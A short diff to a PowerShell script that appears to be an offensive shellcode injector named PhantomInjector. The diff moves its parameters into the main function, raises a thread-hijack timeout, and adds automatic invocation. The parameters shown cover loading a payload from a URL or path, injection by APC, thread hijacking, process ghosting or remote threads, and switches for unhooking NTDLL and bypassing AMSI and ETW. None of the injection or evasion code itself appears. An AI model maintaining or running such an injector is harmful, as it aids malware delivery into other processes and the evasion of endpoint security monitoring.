@@ -15,26 +15,6 @@
     Supported OS: Windows 10/11, Windows Server 2016+
 #>
 
-[CmdletBinding(DefaultParameterSetName='Local')]
-param(
-    [Parameter(ParameterSetName='Remote')]
-    [string]$PayloadUrl,
-
-    [Parameter(ParameterSetName='Local')]
-    [string]$PayloadPath,
-
-    [string]$ProcessName = "notepad",
-    [int]$ProcessId = 0,
-    [ValidateSet('APC','ThreadHijack','GhostProcess','RemoteThread')]
-    [string]$InjectionMethod = "APC",
-    
-    [switch]$UnhookNTDLL,
-    [switch]$UseSyscalls,
-    [switch]$BypassAMSI,
-    [switch]$BypassETW,
-    [switch]$DebugMode
-)
-
 #region Initialization and Evasion
 function Invoke-Initialization {
     # Enable SeDebugPrivilege
@@ -448,7 +428,7 @@ function Invoke-ThreadHijack {
         [byte[]]$Shellcode,
         [string]$ProcessName,
         [int]$ProcessId,
-        [int]$TimeoutMS = 2000
+        [int]$TimeoutMS = 20000
     )
 
     $hijackCode = @"
@@ -1473,6 +1453,34 @@ public class RemoteInjector {
 
 #region Main Execution
 function Invoke-PhantomInjector {
+	[CmdletBinding(DefaultParameterSetName='Local')]
+    param(
+        [Parameter(Mandatory=$true, ParameterSetName='Remote')]
+        [ValidateNotNullOrEmpty()]
+        [string]$PayloadUrl,
+
+        [Parameter(Mandatory=$true, ParameterSetName='Local')]
+        [ValidateNotNullOrEmpty()]
+        [string]$PayloadPath,
+		
+		[Parameter()]
+        [ValidateNotNullOrEmpty()]
+        [string]$ProcessName = 'notepad',
+
+        [Parameter()]
+        [ValidateRange(0, [int]::MaxValue)]
+        [int]$ProcessId = 0,
+
+        [ValidateSet('APC','ThreadHijack','GhostProcess','RemoteThread')]
+        [string]$InjectionMethod = 'APC',
+
+        [switch]$UnhookNTDLL,
+        [switch]$UseSyscalls,
+        [switch]$BypassAMSI,
+        [switch]$BypassETW,
+        [switch]$DebugMode
+    )
+	
     # Initialize evasion techniques
     Invoke-Initialization
 
@@ -1519,3 +1527,6 @@ function Invoke-PhantomInjector {
     }
 }
 
+if ($PSBoundParameters.Count -gt 0) {
+    Invoke-PhantomInjector @PSBoundParameters
+}
